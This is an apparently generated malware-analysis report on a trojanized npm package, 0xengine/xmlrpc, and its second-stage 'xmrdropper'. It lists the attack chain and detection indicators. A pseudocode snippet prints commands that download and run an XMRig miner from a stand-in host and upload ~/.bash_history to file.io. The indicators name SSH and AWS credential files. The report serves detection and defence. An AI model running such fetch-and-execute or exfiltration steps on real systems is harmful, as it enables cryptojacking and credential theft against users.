package_info.why_malicious: The package is a trojanized dependency distributed via fake WordPress credential checkers and proof-of-concept (PoC) exploit repositories. It contains code that steals sensitive credentials (WordPress, SSH, AWS), exfiltrates them to attacker-controlled infrastructure (Dropbox, file.io), and deploys additional payloads such as cryptocurrency miners and backdoors, resulting in both data theft and resource abuse.

execution_context.trigger: import-time (when the package is required by the project or run as part of the credential checker, typically upon initial load or installation)
execution_context.file_location: package.json (as a dependency), main JavaScript entry point of 0xengine/xmlrpc (e.g., index.js or main.js)
required_permissions: filesystem (read access to user home directory and sensitive files)
network (outbound HTTP/S requests to external services)
environment_vars (read access to process environment variables)

malicious_snippets.code_behavior: Harvests AWS credentials, SSH private keys, and environment variables from the victim's home directory and environment, then exfiltrates them to Dropbox using hardcoded credentials. This occurs automatically when the package is loaded, without user interaction or consent.

malice_analysis.why_suspicious: The code accesses highly sensitive credential files and environment variables, then transmits them to an external service (Dropbox) using hardcoded tokens. This is a hallmark of infostealer malware and is not consistent with any legitimate package behavior.
malice_analysis.violated_expectations: A legitimate credentials checker or dependency should only validate user-supplied credentials and never access unrelated secrets or exfiltrate data without explicit user consent.
malice_analysis.similar_legitimate_use: Legitimate backup or synchronization tools may upload files to Dropbox, but only with user authorization and never for credential files or environment variables without explicit configuration.
key_indicators: Outbound HTTP POST requests to content.dropboxapi.com with hardcoded OAuth tokens
No user interaction or consent required for exfiltration
Exfiltration of sensitive data immediately upon package load

execution_context.trigger: runtime (when the credential checker is executed or the PoC exploit is run by the user)
execution_context.file_location: main script of the trojanized credential checker (e.g., yawpp.js) or PoC exploit script
required_permissions: filesystem (read access to credential files such as wp_creds.txt)
network (outbound HTTP/S requests to Dropbox API)

malicious_snippets.code_behavior: Reads WordPress credentials from a local file (wp_creds.txt) and uploads them to Dropbox using a hardcoded access token. This occurs during normal operation of the credential checker or PoC tool, without user notification.

malice_analysis.why_suspicious: The code exfiltrates credential files to a third-party cloud storage service (Dropbox) using a hardcoded token, which is a clear sign of malicious intent and data theft.
malice_analysis.violated_expectations: A credentials checker should only validate credentials locally and never upload user data to external services, especially without user knowledge or consent.
malice_analysis.similar_legitimate_use: No legitimate credential checker uploads user credentials to Dropbox or any external service. Legitimate tools may use Dropbox for user-initiated backups, but never for credential files without explicit configuration.
key_indicators: Use of Dropbox API for file uploads
Hardcoded Dropbox access token in code
Access to and exfiltration of credential files (e.g., wp_creds.txt)
No user prompt or consent for data upload

execution_context.trigger: runtime (as a second-stage payload executed after initial infection, typically triggered by the malicious npm package or credential checker)
execution_context.file_location: k0rn66/xmrdropper (downloaded from Codeberg repository, executed as a binary or script on the victim system)
required_permissions: filesystem (write and execute permissions for downloaded binaries, read access to shell history files)
network (outbound HTTP/S requests for downloading payloads and exfiltrating data)
process (ability to spawn new processes for cryptomining and exfiltration)

malicious_snippets.code_snippet:
# Pseudocode for xmrdropper
import os
import requests

# Download and execute XMRig miner
os.system('curl -O http://malicious.site/xmrig && chmod +x xmrig && ./xmrig')

# Exfiltrate additional files
with open('/home/user/.bash_history', 'rb') as f:
    requests.post('https://file.io', files={'file': f})
malicious_snippets.code_behavior: Downloads and executes a Monero cryptocurrency miner (XMRig) from a remote server, then exfiltrates the user's shell command history (.bash_history) to file.io. This enables both unauthorized resource usage (cryptomining) and further data theft.

malice_analysis.why_suspicious: The code performs unauthorized cryptomining by downloading and running XMRig, and exfiltrates sensitive user data (shell history) to an external file-sharing service. Both actions are clear indicators of compromise and malicious post-exploitation.
malice_analysis.violated_expectations: No legitimate PoC, credential checker, or dependency should download and execute cryptomining software or steal shell history files. These actions are never justified in the context of security tools.
malice_analysis.similar_legitimate_use: There are no legitimate use cases for cryptomining or shell history exfiltration in this context. Automated download and execution of binaries from untrusted sources is always suspicious.
key_indicators: Download and execution of XMRig miner from external URL
Outbound network requests to file.io for data exfiltration
Access to and exfiltration of .bash_history file
Execution of shell commands to download, set permissions, and run binaries

attack_chain.action: Victim is lured into downloading and running a trojanized PoC exploit or WordPress credential checker from GitHub or via phishing, which includes the malicious npm package as a dependency.
attack_chain.leads_to: Malicious npm package (0xengine/xmlrpc) is installed and executed on the victim's system.

attack_chain.action: The malicious npm package executes, harvesting sensitive files such as WordPress credentials, SSH keys, AWS tokens, and environment variables from the victim's system.
attack_chain.leads_to: Exfiltration of harvested data to attacker-controlled Dropbox accounts.

attack_chain.action: A second-stage payload (xmrdropper) is downloaded and executed, which mines Monero cryptocurrency using XMRig and exfiltrates additional files (e.g., shell history) to file.io.
attack_chain.leads_to: Ongoing resource abuse (cryptomining) and further data theft from the victim's system.

behavioral_signatures: npm package accessing sensitive files such as ~/.aws/credentials, ~/.ssh/id_rsa, or reading all environment variables at import-time or runtime
Outbound network requests to content.dropboxapi.com or file.io from credential checking or PoC tools
Execution of cryptomining binaries (e.g., XMRig) or download of binaries from untrusted sources after running a PoC or credential checker
Automated exfiltration of credential files or shell history without user interaction
file_indicators: Presence of 0xengine/xmlrpc or 0xengine/meow in package.json dependencies
Unexpected access to ~/.aws/credentials, ~/.ssh/id_rsa, or ~/.bash_history files by npm packages or credential checkers
Downloaded xmrdropper or XMRig binaries present in the filesystem
Creation or modification of wp_creds.txt or similar credential files followed by network activity
network_indicators: Outbound connections to content.dropboxapi.com with hardcoded OAuth tokens
HTTP POST uploads to file.io from non-browser processes
Downloads from Codeberg or other non-standard repositories (e.g., http://malicious.site/xmrig)
Unusual network activity from credential checker or PoC tool processes
detection_knowledge.how_to_detect: Monitor for npm packages, especially 0xengine/xmlrpc, accessing sensitive credential files or environment variables and making outbound connections to Dropbox (content.dropboxapi.com) or file.io. Flag any credential checker or PoC tool that uploads data externally or downloads and executes cryptomining binaries. Review package.json for suspicious dependencies, audit for unauthorized file access or network activity, and correlate process execution with network and filesystem events to identify automated exfiltration or cryptomining behavior.
